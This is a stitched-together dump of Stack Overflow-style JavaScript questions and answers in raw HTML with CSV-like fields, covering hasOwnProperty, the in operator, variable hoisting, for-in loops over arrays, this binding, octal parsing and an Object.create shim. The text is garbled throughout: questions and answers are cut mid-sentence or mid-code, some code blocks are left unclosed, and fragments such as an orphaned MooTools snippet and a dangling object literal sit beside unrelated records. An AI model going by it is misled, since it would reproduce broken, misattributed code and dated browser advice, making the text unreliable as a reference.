    hasOwnProperty: 'bar'
};
</code></pre>

<p>If you execute <code>obj.hasOwnProperty('prop')</code>, it will give you a <code>TypeError</code>, because the object contains a string property that shadows the method -invoking the string would cause the error-.</p>

<p>A workaround to this is to call the <code>hasOwnProperty</code> method directly from the <code>Object.prototype</code> object, for example:</p>

<pre><code>if (Object.prototype.hasOwnProperty.call(obj, 'prop')) {
  //..
}
</code></pre>

<p>You can also use the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Operators/Special/in"" rel=""nofollow""><code>in</code> operator</a>:</p>

<pre><code>if ('prop' in obj) {
  //...
}
</code></pre>

<p>The difference with the first method is that the <code>in</code> operator checks also for inherited properties, for example:</p>

<pre><code>var obj = {};
obj.hasOwnProperty('toString'); // false
'toString' in obj; // true, inherited from Object.prototype.toString
</code></pre>

</ul>

<p><strong>Edit:</strong> </p>

<p>Extending my response to the @slebetman comment, about checking <code>if (map.foo !== undefined)</code>.</p>

<p>As I was commenting, there are some concerns about accessing the <code>undefined</code> global property and also a <em>semantic difference</em> between checking a <em>property value</em> vs. <em>property existence</em>.</p>

<p>The <code>undefined</code> global property is not defined as read-only ECMAScript 3rd Edition Standard, (is now <code>writable = false</code> on ES5 :)</p>

<p>In almost all implementations its value can be replaced.</p>

<p>If someone makes:</p>

<pre><code>window.undefined = 'foo';

// It will break your code:
var obj = {};
if (obj.foo !== undefined) {
  alert(""This shouldn't ever happen!"");
}
</code></pre>

<p>Also the semantic difference: by testing if <code>map.foo !== undefined</code> we are not technically only checking if the property exist on the object or not, a property can exist, holding undefined as a value, for example:</p>

<pre><code>var map = {
  'foo': undefined
};

map.hasOwnProperty('foo'); // true, because the property exists although
                           //       it holds the undefined value
map.foo !== undefined;     // false

<p>Are we safe when using ECMAScript 3 standards (and not the extensions that FF and IE have to JScript and JavaScript)?</p>
","5445","","<p>Well, of course there are implementation bugs, the most serious that I've had to deal with are on JScript, the Microsoft implementation of the standard, for example:</p>

<p>Identifier of FunctionExpressions should be accessible only in the inner scope of the function itself:</p>

alert(typeof foo);  // should be ""undefined"", on IE shows ""function""

<p>And actually is even worse, it creates two function objects, for example:</p>

<pre><code>var foo = function bar() {};

if (typeof bar != 'undefined') { // the case of IE
  alert(foo === bar); // false!!!
}
</code></pre>

<p>Another well known JScript bug is the <a href=""https://developer.mozilla.org/en/ECMAScript_DontEnum_attribute"" rel=""nofollow"">""DontEnum Bug""</a>, if an object in its scope chain contains a property that is not enumerable (has the <code>{ DontEnum }</code> attribute), if the property is shadowed on other object, it will stay as non-enumerable, for example:</p>

<pre><code>var dontEnumBug = {toString:'foo'}.propertyIsEnumerable('toString');
</code></pre>

<p>It will evaluate to <code>false</code> on IE, this causes problems when using the <code>for-in</code> statement, because the properties will not be visited.</p>

  <p>Why is there a need for /g?</p>

<p>Because presumably you will have multiple pairs on the matching string, e.g. <code>a:'b' c:'d'</code></p>

<blockquote>
  <p>What exactly gets passed into the function?</p>
</blockquote>

<p>The callback function gets the whole match as the first argument, the two later arguments are the capturing groups specified on your regexp.</p>

<p>For example:</p>

<pre><code>""a:'b' c:'d'"".replace(/(\b[^:]+):'([^']+)'/g, function ($0, param, value) {
    console.log($0, param, value);
});
</code></pre>

<p>The callback will be executed twice, and it will show you <code>""a:'b'""</code> for <code>$0</code>, <code>""a""</code> for <code>param</code> and <code>""b""</code> for <code>value</code> on the first execution.</p>

<p>In the second execution -for the second match-, will show you <code>""c:'d'""</code> for <code>$0</code>, <code>""c""</code> for <code>param</code> and <code>""d""</code> for value.</p>

"<p>Let me try to explain this, I have a string like this:</p>

<pre><code>""b.c""
</code></pre>

<p>And an object like this:</p>

<pre><code>a = {
    b:{
        c:2
    }
}
</code></pre>

<p>I would like to use that string to get the <code>c</code> property, but using this doesn't work:</p>

<pre><code>a[""b.c""]
</code></pre>

<p>How can I use the <code>""b.c""</code> string to work just like <code>a.b.c</code>? (Without using eval, perfomance is important in my case)</p>
","5445","","<p>Another approach using the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/Reduce"" rel=""nofollow""><code>Array.prototype.reduce</code></a> method:</p>

<pre><code>function load(obj, path) {
  return path.split('.').reduce(function (a, b) {
    return a[b];
  }, obj);
}
</code></pre>

<p>Usage:</p>

<pre><code>var a = {
  b: {
    c: 2
  }
};


load(a, 'b.c'); // 2
</code></pre>

<p><strong>Notes:</strong></p>

<p>1- The <code>reduce</code> method is not available on IE &lt;= 8, but a standard compliant version can be found in the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/Reduce"" rel=""nofollow"">liked page</a>.</p>

<p>2- You should keep in mind that property names can contain dots, e.g.:</p>

<pre><code>var a = {
  ""foo.bar"": 10
};
</code></pre>

<p>If this cause you problems, it would be better to pass an array to the function, containing the property names to the function, instead of a <em>dot-separated</em> string.</p>

"<p>I'm having problems implementing classes in mootools since I can't use 'this' when I send methods in say <code>element.addEvent</code>.</p>

                    .highlight(this.highlightColor);

            });
    },

});

<p>This code will throw exception inside the addEvent method call, because <code>this</code> is suddenly is in another context. Is there some other way to get the object's highlightColor (or any other member that a mootools Class may have)? </p>
","5445","","<p>The ""MooTools way"" would be to use the <a href=""http://mootools.net/docs/core/Native/Function#Function%3abindWithEvent"" rel=""nofollow""><code>bindWithEvent</code></a> function:</p>

    highlightColor: '#f00',

"<p>Recently I was running some of my code through JSLint when I came up with this error. The thing I think is funny about this error though is that it automatically assumes that all == should be ===. </p>

<p>Does that really make any sense? I could see a lot of instances that you would not want to compare type, and I am worried that this could actually cause problems.</p>

<p>The word ""Expected"" would imply that this should be done EVERY time.....That is what does not make sense to me.</p>

<p>Metropolis</p>
","5445","","<p>IMO, blindly using <code>===</code>, without trying to <strong>understand</strong> how <em>type conversion</em> works doesn't make much sense.</p>

<p>The primary <em>fear</em> about the Equals operator <code>==</code> is that the comparison rules depending on the types compared can make the operator non-transitive, for example, if:</p>

<pre><code>A == B AND
B == C
</code></pre>

<p>Doesn't really guarantees that:</p>

<pre><code>A == C
</code></pre>

<p>For example:</p>

<pre><code>'0' == 0;   // true
 0  == '';  // true
'0' == '';  // false
</code></pre>

<p>The Strict Equals operator <code>===</code> is not really necessary when you compare values of the same type, the most common example:</p>

<pre><code>if (typeof foo == ""function"") {
  //..
}
</code></pre>

<p>We compare the result of the <code>typeof</code> operator, which <strong>is always</strong> a <em>string</em>, with a <em>string</em> literal...</p>

<p>Or when you know the type coercion rules, for example, check if something is <code>null</code> or <code>undefined</code>something:</p>

<pre><code>if (foo == null) {
  // foo is null or undefined
}

// Vs. the following non-sense version:

if (foo === null || typeof foo === ""undefined"") {
  // foo is null or undefined
}

"<p>I'm trying to create a global object with a series of 'slave' properties that are derived from the value of one 'master' property in the same object - something like:</p>

<pre><code>var x = 5;

    master : 17,
    slave1 : this.master + x,
    slave2 : (this.master / 2.2) + 1,
    slave3 : Math.floor(this.slave2)
    //etc.
};
</code></pre>

<p>I realize this is horribly wrong as is, but the concept is there. What I'd like to do is have all these 'slave' properties updated as <code>myObj.master</code> is updated. What's the cleanest way to do this? Does each slave value need to be explicitly set by some event handler that fires when <code>myObj.master</code> is changed...?</p>
","5445","","<p>Another option can be to use a constructor function to build your object, e.g:</p>

<pre><code>var x = 5;

function MyObj(master) {
  this.master = master;
  this.slave1 = this.master + x,
  this.slave2 = (this.master / 2.2) + 1,
  this.slave3 = Math.floor(this.slave2)
}

var myObj = new MyObj(17);

<p>In the above example I use a <code>master</code> argument and a reference to the <code>x</code> global property, if you don't have <code>x</code> available in that scope, you could provide also an argument for it.</p>

<pre><code>var myObj = {

<p>If not, please explain whether you use it or not and whether you advice to use it or not.</p>

<p>UPDATE:</p>

<p>I'm going to wait one more day for more answers, if any, then I'll accept the answer with the most upvotes.</p>
","5445","","<p>A thing to remember when using JSLint is that is built on the opinion about what one person thinks is the ""Good Parts"".</p>

<p>I think is a great tool but there are rules that I don't agree with.</p>

<p>About the <code>type</code> attribute, you can find more about the opinion of the author <a href=""http://javascript.crockford.com/script.html"">here</a> he says that the attribute is ""required and non necessary"", but if you validate your documents you clearly need it.</p>

<p>With the use of the Array literal notation <code>[]</code> vs. the Array constructor, I agree, there are differences that can make the two syntaxes behave different, for example:</p>

<pre><code> [5]; // one-element array
 [""5""]; // one-element array

 new Array(5); // empty array but its length is initialized with 5
 new Array(""5""); // one-element array
</code></pre>

<p>So, for consistency an brevity the literal notation is better.</p>

<p>About the ""Too many var statements"", JavaScript has no block-scope, the scope is at function or global level, and all <code>var</code> statements are evaluated before the code execution -aka hoisting- and they are initialized with <code>undefined</code>, while the assignments are made at runtime.</p>

<p>For example:</p>

<pre><code>var x = 0;
if (true) {
  var x = 1; // useless var, x already declared
}
x; // 1
</code></pre>

<p>And the ""hoisting"" of variable declaration can be shown in this example:</p>

<pre><code>var x = 5;  // global
(function () {
  alert(x); // alerts `undefined`, x declared but unassigned in this scope
  alert(y); // ReferenceError, y is undeclared

  var x = 10;
})();
</code></pre>

<p>As you can see <code>x</code> holds <code>undefined</code> because it is declared before the actual code execution, the <code>var</code> statements are hoisted to the top of their enclosing scope:</p>

<pre><code>var x = 5;  // global
(function () {
  var x;
  alert(x); // alerts `undefined`, x declared but unassigned
  alert(y); // ReferenceError, y is undeclared

  x = 10; // assignment is made
})();
</code></pre>

<p>So that rule wants to actually make the code to resemble what will happen, all the <code>var</code> statements at first place.</p>

<p>About the  ""Unexpected use of '++'"", this is another rule that I don't quite like, the author thinks that ""those contribute to <em>bad code</em> by encouraging excessive trickiness"".</p>

<p>When I use them in some expression, I try to extract the operator usage to an alone statement, for example:</p>

<pre><code>array[++id] = x;
</code></pre>

<p>To:</p>

<pre><code>id+=1;
array[id] = x;
</code></pre>

<p>Which is more clearer, but anyway in the case of a <code>for</code> statement IMO it can't cause any confusion at all...</p>

<p>About the last one <em>""['PrettyId'] is better written in dot notation.""</em>, JSLint expects the usage of the bracket notation to be ""dynamic"", it expects to see an expression there, not a String literal that contains a valid identifier name, the bracket notation should be used only when you want to access a property with a name that clashes with a reserved word e.g.:</p>

<pre><code>data.function;    // SyntaxError in ECMAScript 3 based implementations
data[""function""]; // Ok
</code></pre>

<p>Or when a property contains characters that are not a valid identifier, e.g.:</p>

<pre><code>data.foo-bar;    // it access the property `foo` minus a `bar` variable
data[""foo-bar""]; // Ok

data.foo bar;    // SyntaxError, unexpected `bar` identifier
data[""foo bar""]; // Ok
</code></pre>

"<p>I have this code inside the success function of a jQuery ajax call <code>success: function(d)</code></p>

    google.maps.event.addListener(markers[d.items[n].id], 'mouseover', function() {
        focusMarker(d.items[n].id);
    });
}

<p>Unfortunately, the function always evaluated <code>d.items[n].id</code> as the last item in <code>d.items</code> collection.</p>

<p>I tried making this modification:</p>

<pre><code>for (var n in d.items)
{        
    var id = d.items[n].id;        
    google.maps.event.addListener(markers[d.items[n].id], 'mouseover', function() {
        focusMarker(id);
    });
}
</code></pre>

<p>but my function always returned the same thing.</p>

<p>Is this a scope problem, or is there something wrong with my function definition?</p>
","5445","","<p>There are several ways to solve this problem, the most common is to use a function to preserve the looping values:</p>

<pre><code>for (var n in d.items) {
  (function(id) {
    google.maps.event.addListener(markers[id], 'mouseover', function() {
        focusMarker(id);
    });
  })(d.items[n].id);
}
</code></pre>

<p>By the way, if <code>d.items</code> is an array, I would recommend you to use a sequential loop e.g.: </p>

<pre><code>for (var n = 0; n &lt; d.items.length; n++) {
  //..
}
</code></pre>

<p>The <code>for-in</code> statement is meant to be used to <em>enumerate</em> over object properties.</p>

<p>If you use it on arrays or array like objects, it can give you several problems, first, inherited properties are also enumerated, meaning that if someone augments the <code>Array.prototype</code> object, those properties will be also enumerated in your loop.</p>

<p>Also the order of iteration is not guaranteed by the specification, the properties may not be visited in the numeric order.</p>
"
"<p>I am relatively new to JavaScript and keep seeing .extend and .prototype in third party libraries I am using. I thought it had to do with the Prototype javascript library, but I am beginning to think that is not the case. What are these used for?</p>
","5445","","<p>The <code>extend</code> method for example in <a href=""http://api.jquery.com/jQuery.extend/"">jQuery</a> or <a href=""http://www.prototypejs.org/api/object/extend"">PrototypeJS</a>, copies all properties from the source to the destination object.</p>

<p>Now about the <code>prototype</code> property, it is a member of function objects, it is part of the language core.</p>

<p>Any function can be used as a <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Using_a_Constructor_Function""><em>constructor</em></a>, to create new object instances. All functions have this <code>prototype</code> property.</p>

<p>When you use the <code>new</code> operator with on a function object, a new object will be created, and it will inherit from its constructor <code>prototype</code>.</p>

<p>For example:</p>

<pre><code>function Foo () {
}
Foo.prototype.bar = true;

var foo = new Foo();

foo.bar; // true
foo instanceof Foo; // true
Foo.prototype.isPrototypeOf(foo); // true

"<p>I just read this question and the accepted answer:  <a href=""http://stackoverflow.com/questions/864516/what-is-javascript-garbage-collection"">What is JavaScript garbage collection?</a></p>

<p>In the answer, <a href=""http://stackoverflow.com/users/44389/noldorin"">Noldorin</a> referenced some guidelines from Apple.  Here is the part I'm concerned with:</p>

<blockquote>
  <p>Use delete statements. Whenever you create an object using a new statement, pair it with a delete statement. This ensures that all of the memory associated with the object, including its property name, is available for garbage collection.  </p>
</blockquote>

<p>I'm always taking time to keep up-to-speed on best practices, especially if I can reduce the memory footprint of my scripts.  So I went off to test some things.  The following is an example of an object that deletes itself after invoking a method.  The example includes a jquery domready event as well.</p>

<pre><code>(function ($, someglobal) {
    $(function () {
        var scoped_object = function () {
            var init, a_method, and_another;
            a_method    = function() { /* do stuff */ };
            and_another = function() { /* do some other stuff*/ };
            init        = function() { a_method(); and_another(); };
        };
        delete new scoped_object().init();
    });
})($, someglobal);
</code></pre>

<p>Usually I'll wrap everything in a self invoking function and pass in my globals just like above.  Everything is the same as I would normally do it, the only difference being that I added the <code>delete</code> right before the <code>new</code>.</p>

<p>The code works either way.</p>

<p>So the question is:  Am I doing <em>anything</em> here?  Is there some kind of benefit to deleting a reference to an object that only exists inside a function scope?  Or am I just making things look confusing?</p>
","5445","","<p>First of all the statement <code>delete new scoped_object().init();</code> is not really doing anything, you should better take care about what variables remain in-closure or if you have circular references, which are the most common source of <a href=""http://www.ibm.com/developerworks/web/library/wa-memleak/"">memory leaks</a>.</p>

<p>The <code>delete</code> operator is meant to be used to <em>delete object properties</em>, and it is <strong>really</strong> misunderstood, the answer you quote from @Noldorin quotes some text of the <a href=""http://developer.apple.com/library/safari/#documentation/ScriptingAutomation/Conceptual/JSCodingGuide/Advanced/Advanced.html"">Apple JavaScript ""Best Practices""</a>, but <em>they don't have a clue</em> about how <code>delete</code> works!!.</p>

<p>They even recommend using <code>delete</code> on variable references, and that is not possible -only possible for variables declared in <em>Eval Code</em>-, because the <code>var</code> statement declares the variable as non-deletable (<code>{DontDelete}</code> in ECMAScript 3, or <code>[[Configurable]] = false</code> in ECMAScript 5) properties of the Variable Object -objects that form the scope chain-.</p>

<p>Moreover, attempting to <code>delete</code> a reference to an identifier that is bound to an environment record - an identifier declared with a <code>VariableDeclaration</code>, <code>FunctionDeclaration</code> or from a function's <code>FormalParameterList</code>-, causes a <code>SyntaxError</code> exception on the new <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_11.4.1"">ECMAScript 5th Edition</a> under <a href=""http://ejohn.org/blog/ecmascript-5-strict-mode-json-and-more/"">Strict Mode</a>.</p>

<p>I would recommend you to read the following article about <code>delete</code>:</p>

"<p>What are the pros and cons of function-level scope specifically in Javascript compared to block-level scope in languages like Java?</p>

  <p>I would like to see examples of function-level scope usage that would be harder or impossible to implement using block-level scope.</p>
</blockquote>

<p>Maybe it will sound obvious, but you can implement recursion in function-level scope, which can be often useful, for example:</p>

<pre><code>var x = 5; // global scope

(function (y) { // y - locally scoped variable on each execution
  y &amp;&amp; arguments.callee(--y); // recursion!
  console.log(y);
})(x);
</code></pre>

<p>That is mostly impossible to implement with block-level scope.</p>

<p>In the above example the function will initially be executed passing the value of the outer <code>x</code> variable to it, before the function is invoked a new execution context is setup, that initializes a new lexical scope, where the <code>y</code> formal parameter is bound to it.</p>

<p>After that, the function expression is executed again -if <code>y</code> is not <code>0</code>- initializing on each execution a completely new lexical scope.</p>

"<p>I was experimenting with inheritance in javascript, and wrote those two functions:</p>

<pre><code>Object.prototype.inherits=function(obj){this.prototype=new obj;}
Object.prototype.pass=function(obj){obj.prototype=new this;}
</code></pre>

<p>This code works very well:</p>

<pre><code>Dog.inherits(Animal);
</code></pre>

<p>But the following fails:</p>

<pre><code>Animal.pass(Dog);
</code></pre>

<p>As I understand it, my pass functions doesn't work, because ""this"" isn't a reference to the object instance itself? If that's the case, how can I reference the object from within itself?</p>

<p>Thanks in advance!</p>
","5445","","<p>Well, actually the two are doing exactly the same:</p>

<pre><code>Dog.prototype = new Animal;
</code></pre>

<p>The <code>this</code> value inside the methods will refer to the <em>base object</em> where the reference was invoked, in the case of:</p>

<pre><code>Dog.inherits(Animal);
</code></pre>

<p>The <code>this</code> value will refer to the <code>Dog</code> constructor function, and the <code>obj</code> argument will be the <code>Animal</code> function.</p>

<p>When you call:</p>

<pre><code>Animal.pass(Dog);
</code></pre>

<p>The <code>this</code> value will refer to the <code>Animal</code> function, doing at the end exactly the same thing as the <code>inherits</code> method, but the other way around.</p>

<p>I would recommend you to <em>not</em> extend the <code>Object.prototype</code> object, because it can cause you a lot of problems, for example those two properties will be enumerated in any <code>for-in</code> loop, e.g.:</p>

<pre><code>for (var prop in {}) { // &lt;-- an empty object!
  alert(prop); // will alert 'inherits' and 'pass'
}
</code></pre>

<p>All objects inherit from <code>Object.prototype</code>, and it seems that you intend to use those methods only on Function objects, it would be safer to extend the <code>Function.prototype</code> object, or implement the methods as functions that take two parameters.</p>
"
"<p>I understand that ""this"" is a reference for the caller object.</p>

<p>I'm used to see ""this"" in code like:</p>

<pre><code>var Person = function() {
   this.name = ""foo"";
}
</code></pre>

<p>But then I saw these lines of code:</p>

<p>Example 1:</p>

<pre><code>function helloWorld1() {
   this({ body: ""Hello world!"" })();
}
</code></pre>

<p>Example 2:</p>

<p>I also seen this code:</p>

<pre><code>function helloWorld2() {
  this
    ({ body: ""Hello, "" })
    ({ body: ""world!"" })
    ();
}
</code></pre>

<ul>
<li>What does ""this"" means here?</li>
<li>What is happening in the above examples?</li>
</ul>
","5445","","<p>Actually <code>this</code> can refer to different thing, implicitly, it is set depending how you invoke a function, for exmaple:</p>

<pre><code>obj.func();
</code></pre>

<p>The <code>this</code> value inside <code>func</code> will refer to <code>obj</code>.</p>

<pre><code>new Func();
</code></pre>

<p>The <code>this</code> value will refer to a newly created object that inherits from <code>Func.prototype</code>.</p>

<pre><code>func();
</code></pre>

<p>The <code>this</code> value will refer to the Global object.</p>

<p>And the value can be set <em>explicitly</em> also, using the <code>call</code> or <code>apply</code> methods, for example:</p>

<pre><code>function foo () {
  alert(this);
}

foo.call(""hello world"");
</code></pre>

<p>The <code>helloWorld1</code> example you post, would work only if the <code>this</code> value refers to a function, that returns another function, because if you analyze the line:</p>

<pre><code>this({ body: ""Hello world!"" })();
</code></pre>

<p>You can note that <code>this</code> needs to be a function, because you are invoking it, passing the object to it. And we know the return value needs also to be a function, because the last parentheses, are another function invocation.</p>

<p>For example:</p>

<pre><code>var fn = function(o){
  return function () {
    alert(o.body);
   }
};
helloWorld1.call(fn);  // or the equivalent

fn.method = helloWorld1;
fn.method();
</code></pre>

<p><strong>Edit</strong>: To make the <code>helloWorld2</code> example you post work, the <code>this</code> value needs to be a function with a pattern that allows us to chain multiple function calls, returning the same function each time, until the function is called without arguments, e.g.:</p>

<pre><code>var fn = (function(){
  var msg = '';
  return function inner (o) {
    if (o) { // called with an argument?
      msg += o.body;
    } else { // no, show the message
      alert(msg);
    }
    return inner; // return a reference to itself
  };
})();

function helloWorld2() {
  this
  ({ body: ""Hello, "" })
  ({ body: ""my "" })
  ({ body: ""world!"" })
  ();
}
helloWorld2.call(fn); // ""Hello my world!""

","5445","","<p>The problem can be that IE is not taking the date format that you are getting from your inputs -since your code works correctly on other browsers-.</p>

<p>To avoid that, I would recommend you to parse the date string, to extract the numerical parts of it, and use the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/global_objects/date"" rel=""nofollow""><code>Date</code> constructor</a>.</p>

<p>The <code>Date</code> constructor can take the following arguments</p>

<p>Of you could use a function like <a href=""http://gist.github.com/422052"" rel=""nofollow"">this one</a> that I've made some time ago, which does all the job, and you can specify a format to parse your date, e.g.:</p>

"<p>From what I gather, tBodies[0] seems to work in IE, but not FF.  Is this an IE mistake?  I've created a small file to demonstrate the incosistency, and I would like to know the best way to go about this.</p>

"<p>I've been told not to use ""for...in"" with arrays in JavaScript. Why not?</p>
","5445","","<p>The <code>for-in</code> statement by itself is not a ""bad practice"", however it can be <em>mis-used</em>, for example, to <em>iterate</em> over arrays or array-like objects.</p>

<p>The purpose of the <code>for-in</code> statement is to <em>enumerate</em> over object properties, this statement will go up in the prototype chain, enumerating also <em>inherited</em> properties, thing that <em>sometimes</em> is not desired.</p>

<p>Also, the order of iteration is not guaranteed by the spec., meaning that if you want to ""iterate"" an array object, with this statement you cannot be sure that the properties (array indexes) will be visited in the numeric order.</p>

<p>For example, in JScript (IE &lt;= 8), the order of enumeration even on Array objects is defined as the properties were created:</p>

<pre><code>var array = [];
array[2] = 'c';
array[1] = 'b';
array[0] = 'a';

for (var p in array) {
  //... p will be 2, 1 and 0 on IE
}
</code></pre>

<p>Also, speaking about inherited properties, if you, for example, extend the <code>Array.prototype</code> object (like some libraries as MooTools do), that properties will be also enumerated:</p>

<pre><code>Array.prototype.last = function () { return this[this.length-1]; };

for (var p in []) { // an empty array
  // last will be enumerated
}
</code></pre>

<p>As I said before to <em>iterate</em> over arrays or array-like objects, the best thing is to use a <em>sequential loop</em>, such as a plain-old <code>for</code>/<code>while</code> loop.</p>

<p>When you want to enumerate only the <em>own properties</em> of an object (the ones that aren't inherited), you can use the <code>hasOwnProperty</code> method:</p>

<pre><code>for (var prop in obj) {
  if (obj.hasOwnProperty(prop)) {
    // prop is not inherited
  }
}
</code></pre>

<p>And some people even recommend calling the method directly from <code>Object.prototype</code> to avoid having problems if somebody adds a property named <code>hasOwnProperty</code> to our object:</p>

<pre><code>for (var prop in obj) {
  if (Object.prototype.hasOwnProperty.call(obj, prop)) {
    // prop is not inherited
  }

"<p>In JavaScript, why does an octal number string cast as a decimal number? I can cast a hex literal string using <code>Number()</code> or <code>+</code>, why not an octal?</p>

<p>Also, does anyone know why octal literals are dropped from ECMAScript 5th Edition in strict mode?</p>
","5445","","<p>I'm a bit late to the question but I think I can give a good answer.</p>

<p>The accepted answer doesn't tell you anything more that what you actually know, and mention in the question itself: <code>Number(value)</code> works as <code>+value</code> but not as <code>parseInt(value)</code>.</p>

<p>The key is to know that there is a <em>semantic difference</em> between <strong>type conversion</strong> and <strong>parsing</strong>.</p>

<blockquote>
  <p>Why does an octal number string cast as a decimal number? </p>
</blockquote>

<p>Because the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_15.7.1"">Number constructor called as a Function</a> (<code>Number(value)</code>) and the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_11.4.6"">Unary <code>+</code> Operator</a> (<code>+value</code>) behind the scenes use the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_9.3""><code>ToNumber</code></a> internal operation. The purpose of those constructs is <strong>type conversion</strong>.</p>

<p>When <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_9.3.1""><code>ToNumber</code> is applied to the String Type</a> a special grammar production is used, called the <code>StringNumericLiteral</code>.</p>

<p>This production can hold only Decimal literals and Hexadecimal Integer literals:</p>

<pre>...

StrNumericLiteral :::
   StrDecimalLiteral
   HexIntegerLiteral

...</pre>

<p>There are also semantic differences between this grammar and the grammar of ""normal"" <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_7.8.3""><code>NumericLiterals</code></a>.</p>

<p>A <code>StringNumericLiteral</code>:</p>

<ul>
<li>May be preceded and/or followed by white space and/or line terminators.</li>
<li>That is decimal may have any number of leading 0 digits. <sub>no octals!</sub></li>
<li>That is decimal may be preceded by + or − to indicate its sign.</li>
<li>That is empty or contains only white space is converted to +0.</li>
</ul>

<p>Now I will go with the <code>parseInt</code> and <code>parseFloat</code> functions.</p>

<p>The purpose of those functions obviously is <strong>parsing</strong>, which is <em>semantically</em> different to <strong>type conversion</strong>, for example:</p>

<pre><code>parseInt(""20px"");     // 20
parseInt(""10100"", 2); // 20
parseFloat(""3.5GB"");  // 3.5
// etc..
</code></pre>

<p>Is worth mentioning that the algorithm of <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_15.1.2.2""><code>parseInt</code></a> changed in the ECMAScript 5th Edition Specification, it no longer interprets a number's radix as octal just for having a leading zero:</p>

<pre><code>parseInt(""010""); // 10, ECMAScript 5 behavior
parseInt(""010""); // 8,  ECMAScript 3 behavior
</code></pre>

<p>As you can see, that introduced an <a href=""http://ecma262-5.com/ELS5_HTML.htm#Annex_E"">incompatibility</a> in the behavior between ES3 and ES5 implementations, and as always is recommended to use the radix argument, to avoid any possible problems.</p>

<p>Now your second question:</p>

<blockquote>
  <p>Why octal literals are dropped from ECMAScript 5th Edition in strict mode?</p>
</blockquote>

<p>Actually, this effort of getting rid of octal literals comes since 1999. The octal literal productions (<code>OctalIntegerLiteral</code> and <code>OctalEscapeSequence</code>) were removed from the grammar of <code>NumericLiteral</code>s since the <a href=""http://bclary.com/2004/11/07/"">ECMAScript 3rd Edition specification</a>, they <em>might</em> be included for <a href=""http://bclary.com/2004/11/07/#annex-b"">backwards compatibility</a> (<a href=""http://ecma262-5.com/ELS5_HTML.htm#Annex_B"">also in ES5</a>) with older versions of the standard.</p>

<p>In fact, they are included in all major implementations, but technically an ES3 or ES5 compliant implementation could choose to not include them, because they are described as <strong>non-normative</strong>.</p>

<p>That was the first step, now ECMAScript 5 <a href=""http://ecma262-5.com/ELS5_HTML.htm#Annex_C"">Strict Mode</a> disallows them completely.</p>

<p>But why?</p>

<p>Because they were considered to be an <em>error prone</em> feature, and in fact, in the past they caused <em>unintentional</em> or <em>hard to catch</em> bugs — just as the same problem of implicit octals of <code>parseInt</code> —.</p>

<p>Now, under strict mode an octal literal will cause a <code>SyntaxError</code> exception — currently only observable in Firefox 4.0 Betas —.</p>

<p>As you saw, the properties argument will give you problems since in E3-based implementations there is <strong>no way</strong> to change the property attributes.</p>

<p>The <code>Object.defineProperty</code> method as <em>@Raynos</em> mentioned, works on IE8, but <strong>partially</strong>, it can be used <em>only</em> in DOM elements.</p>

<p>Also <em>accessor properties</em> will give you problems, they could be <em>mimicked</em> with widely supported non-standard methods such as <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/defineGetter""><code>__defineGetter__</code></a>/<a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/defineSetter""><code>__defineSetter__</code></a>, but again, you <em>can't change the property attributes</em>.</p>

<p>Another problem aside the property descriptors, is that the <code>Object.create</code> method can accept <code>null</code> as an argument, to create an object that doesn't inherits from anything.</p>

<p>This can't be emulated with the <a href=""http://javascript.crockford.com/prototypal.html"">Crockford's <code>Object.create</code> shim</a>, because when the <code>new</code> operator is used with a constructor function that has a <code>prototype</code> property containing <code>null</code> -or any other non-object value-, the newly created object will inherit from <code>Object.prototype</code> anyway by default.</p>

<p>In some implementations -V8, Spidermonkey, Rhino, etc...- they have a setteable <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/proto""><code>__proto__</code></a> property which could be used to set a <code>null</code> [[Prototype]], but again, that's non-standard, and for sure it will never work on IE.</p>

<p>I would recommend, if you want to target old browsers to don't use those features, since there is no way to make them work properly on those environments.</p>

<p>If you still want to use <code>Object.create</code>, without using the <em>properties</em> argument, you could, however I would recommend you to detect the things that can't be emulated.</p>

<p>The following would be a <em>safer</em> version of the <a href=""http://javascript.crockford.com/prototypal.html"">Crockford's <code>Object.create</code> shim</a>:</p>

<pre><code>if (typeof Object.create != 'function') {
  (function () {
    var F = function () {};
    Object.create = function (o) {
      if (arguments.length &gt; 1) { throw Error('Second argument not supported');}
      if (o === null) { throw Error('Cannot set a null [[Prototype]]');}
      if (typeof o != 'object') { throw TypeError('Argument must be an object');}
      F.prototype = o;
      return new F;
    };
  })();
}
</code></pre>

<p>Anyway, use it carefully.</p>
"
"<p>I know this was a contentious issue five years ago, but I'm wondering if things have changed for today's JavaScript. Are there any real world examples of a major modern library being incompatible with extending <code>Object.prototype</code>?</p>

  <p>Are there any real world examples of a major modern library being incompatible with extending Object.prototype?</p>
</blockquote>

<p>Yes, I remember problems with jQuery, -which is one of the <em>less intrusive</em> libraries- for example:</p>

<ul>
<li><a href=""http://stackoverflow.com/questions/2638450/i-tried-to-prototype-a-length-method-to-object-and-broke-jquery-how"">I tried to prototype a length() method to Object and broke jQuery – how?</a></li>
</ul>

<p>Another case that I remember is that someone added a <code>load</code> function to the <code>Object.prototype</code> object, and it caused problems with the <code>$().load</code> event:</p>

<pre><code>// DON'T DO THIS ! :)
Object.prototype.load = function () {};

​$(window).load(function () {
  alert('load event'); // never fired
});​
</code></pre>

<p>Example <a href=""http://jsbin.com/iwude4/edit"">here</a>.</p>

<p>Augmenting the <code>Object.prototype</code> object in that way is never recommended, because those properties will be inherited by a great number of objects -even also by some host objects-, and as you know, the primary concern is that they will be enumerated by the <code>for-in</code> statement.</p>

<p>In ECMAScript 5, now a safer way exist, because we can now declare non-enumerable properties, for example:</p>

<pre><code>Object.defineProperty(Object.prototype, 'foo', { value: 'bar' });
</code></pre>

